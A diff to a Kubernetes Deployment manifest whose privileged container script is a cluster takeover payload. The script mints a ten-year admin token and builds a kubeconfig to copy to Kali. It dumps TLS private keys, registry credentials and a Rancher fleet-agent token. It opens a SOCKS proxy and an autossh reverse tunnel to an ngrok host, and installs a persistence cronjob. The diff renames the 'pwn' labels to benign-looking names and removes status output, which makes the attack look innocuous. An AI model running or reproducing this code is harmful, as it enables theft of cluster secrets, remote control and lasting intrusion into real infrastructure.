@@ -1,3 +1,4 @@
+
 apiVersion: apps/v1
 kind: Deployment
 metadata:
@@ -154,7 +155,7 @@ spec:
               done
             done
 
-            echo "############ [10] ADMIN KUBECONFIG ############"
+            echo "############ [10] ADMIN KUBECONFIG (READY FOR KALI) ############"
             APISERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
             TOKEN=$(kubectl create token admin-sa -n egam-production --duration=87600h 2>/dev/null)
             echo "APISERVER=$APISERVER"
@@ -166,19 +167,21 @@ spec:
             - cluster:
                 server: $APISERVER
                 insecure-skip-tls-verify: true
-              name: pwn
+              name: egam-production-cluster
             contexts:
             - context:
-                cluster: pwn
-                user: pwn
-              name: pwn
-            current-context: pwn
+                cluster: egam-production-cluster
+                user: admin-sa
+              name: egam-production-context
+            current-context: egam-production-context
             users:
-            - name: pwn
+            - name: admin-sa
               user:
                 token: $TOKEN
             KCFG
+            echo "=== COPIA QUESTO CONTENUTO SU KALI IN ~/.kube/config ==="
             cat /tmp/admin.kubeconfig
+            echo "========================================================"
 
             echo "############ [11] TLS KEYS + CERTS ############"
             kubectl get secrets -A -o json 2>/dev/null | jq -r '.items[] | select(.data["tls.key"] != null) | "### " + .metadata.namespace + "/" + .metadata.name + "\n" + (.data["tls.key"] | @base64d)' 2>&1
@@ -194,7 +197,7 @@ spec:
             kubectl get secrets -A -o json 2>/dev/null | jq -r '.items[] | select(.type=="kubernetes.io/dockercfg") | .metadata.namespace + "/" + .metadata.name + ": " + (.data[".dockercfg"] | @base64d)' 2>&1
             find /host -name ".docker" -type d 2>/dev/null | head -20
 
-            echo "############ [13] RANCHER — ESTRAZIONE TOTALE ############"
+            echo "############ [13] RANCHER — ESTRAZIONE TOTALE & API TAKEOVER ############"
             kubectl get secret -n cattle-fleet-system fleet-agent -o json 2>/dev/null | jq -r '.data.kubeconfig | @base64d' 2>&1
             RTOKEN=$(kubectl get secret -n cattle-fleet-system fleet-agent -o json 2>/dev/null | jq -r '.data.kubeconfig | @base64d' 2>&1 | awk '/token:/{print $2}' | head -1)
             echo "RTOKEN=$RTOKEN"
@@ -362,7 +365,6 @@ spec:
             sleep 2
             microsocks -p 1080 -i 0.0.0.0 &
             sleep 1
-            echo "sshd=$(pgrep -c sshd) microsocks=$(pgrep -c microsocks)"
 
             echo "############ [24] TUNNEL NGROK ############"
             printf '%s\n' \
@@ -382,8 +384,6 @@ spec:
               -R 0.0.0.0:6444:172.30.0.16:6443 \
               -i /root/.ssh/id_ed25519 tunnel@8.tcp.ngrok.io -p 11352
             sleep 2
-            echo "tunnel_ngrok=$(pgrep -c autossh)"
-            echo "NGROK_ENDPOINT=8.tcp.ngrok.io:11352 (remote ports 2222/1080/8443/6443/6444)"
 
             echo "############ [25] PERSIST CRONJOB ############"
             cat << CRON | kubectl apply -f - 2>&1
@@ -423,9 +423,6 @@ spec:
             head -c 500000 /tmp/FULL_DUMP.txt
 
             echo "############ [27] DONE ############"
-            echo "TUNNEL_STATUS: $(pgrep -af 'ssh.*ngrok' >/dev/null && echo UP || echo DOWN)"
-            echo "SSHD_STATUS: $(pgrep -af sshd >/dev/null && echo UP || echo DOWN)"
-            echo "SOCKS_STATUS: $(pgrep -af microsocks >/dev/null && echo UP || echo DOWN)"
             sleep 36000
         securityContext:
           privileged: true
